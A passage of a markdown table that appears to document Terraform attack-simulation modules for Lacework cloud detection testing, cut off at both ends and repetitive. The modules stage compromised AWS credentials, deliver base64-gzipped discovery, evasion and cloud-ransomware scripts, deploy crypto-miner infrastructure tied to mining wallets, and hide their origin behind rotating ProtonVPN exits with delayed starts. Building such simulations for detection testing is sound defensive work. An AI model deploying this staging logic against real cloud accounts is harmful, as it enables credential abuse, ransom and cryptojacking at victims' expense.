tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = "US"<br/>                                    protonvpn\_tier = tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "crypto\-gpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\["ethermine\_wallet"\]<br/>                                    region = var\.inputs\["region"\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "host\-cpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    region = var\.inputs\["region"\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\["minergate\_user"\]<br/>                                    nicehash\_user = var\.inputs\["nicehash\_user"\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl",<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh"<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh"<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh"<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh"<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh"<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh"<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh"<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_start\.sh"<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>          |
| attacker-simulation-attacker-exec-docker-composite-compromised-credentials | ./modules/ssm/execute-docker-composite-compromised-credentials | ssm_exec_docker_compromised_keys           | context.aws.ssm.attacker.execute.docker_composite_compromised_credentials | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_compromised_credentials": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-compromised-credentials | <pre>locals \{<br/>    attack\_dir = "/cloud\-tunnel"<br/>    script = "discovery\.sh"<br/>    script\_type = "scoutsuite"<br/>    attack\_type = "compromised\_keys"<br/>    aws\_creds = join\("\\n", \[ for u,k in var\.inputs\["compromised\_credentials"\]: "echo '$\{k\.rendered\}' > $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}" \]\)<br/>    payload = <<\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo '$\{base64gzip\(local\.start\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/start\.sh<br/>    echo '$\{base64gzip\(local\.auto\-free\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo '$\{base64gzip\(local\.auto\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo '$\{base64gzip\(local\.protonvpn\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo '$\{base64gzip\(local\.protonvpn\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo '$\{base64gzip\(local\.protonvpn\-baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo '$\{base64gzip\(local\.baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo '$\{base64gzip\(local\.discovery\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo '$\{base64gzip\(local\.evasion\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo '$\{base64gzip\(local\.cloudransom\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo '$\{base64gzip\(local\.cloudcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo '$\{base64gzip\(local\.hostcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log "Starting as background job\.\.\."<br/>    if \[ "$\{var\.inputs\["protonvpn\_tier"\]\}" == "0" \]; then<br/>        for i in $\(echo "US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55"\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-$i; done<br/>        /bin/bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo "AU CR IS JP LV NL NZ SG SK US"\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-paid\-$i; done<br/>        /bin/bash auto\-paid\.sh<br/>    fi;<br/>    log "Done\."<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = "US"<br/>                                    protonvpn\_tier = tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "crypto\-gpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\["ethermine\_wallet"\]<br/>                                    region = var\.inputs\["region"\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "host\-cpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    region = var\.inputs\["region"\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\["minergate\_user"\]<br/>                                    nicehash\_user = var\.inputs\["nicehash\_user"\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl",<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh"<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh"<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh"<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh"<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh"<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh"<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh"<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_start\.sh"<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>          |
| attacker-simulation-attacker-exec-docker-composite-defense-evasion         | ./modules/ssm/execute-docker-composite-defense-evasion         | ssm_exec_docker_defense_evasion            | context.aws.ssm.attacker.execute.docker_composite_defense_evasion         | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_defense_evasion": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-defense-evasion         | <pre>locals \{<br/>    attack\_dir = "/cloud\-tunnel"<br/>    script = "evasion\.sh"<br/>    script\_type = "aws\-cli"<br/>    attack\_type = "defense\_evasion"<br/>    aws\_creds = join\("\\n", \[ for u,k in var\.inputs\["compromised\_credentials"\]: "echo '$\{k\.rendered\}' > $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}" \]\)<br/>    payload = <<\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo '$\{base64gzip\(local\.start\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/start\.sh<br/>    echo '$\{base64gzip\(local\.auto\-free\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo '$\{base64gzip\(local\.auto\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo '$\{base64gzip\(local\.protonvpn\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo '$\{base64gzip\(local\.protonvpn\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo '$\{base64gzip\(local\.protonvpn\-baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo '$\{base64gzip\(local\.baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo '$\{base64gzip\(local\.discovery\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo '$\{base64gzip\(local\.evasion\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo '$\{base64gzip\(local\.cloudransom\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo '$\{base64gzip\(local\.cloudcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo '$\{base64gzip\(local\.hostcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log "Starting as background job\.\.\."<br/>    if \[ "$\{var\.inputs\["protonvpn\_tier"\]\}" == "0" \]; then<br/>        for i in $\(echo "US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55"\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-$i; done<br/>        /bin/bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo "AU CR IS JP LV NL NZ SG SK US"\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-paid\-$i; done<br/>        /bin/bash auto\-paid\.sh<br/>    fi;<br/>    log "Done\."<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = "US"<br/>                                    protonvpn\_tier = tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                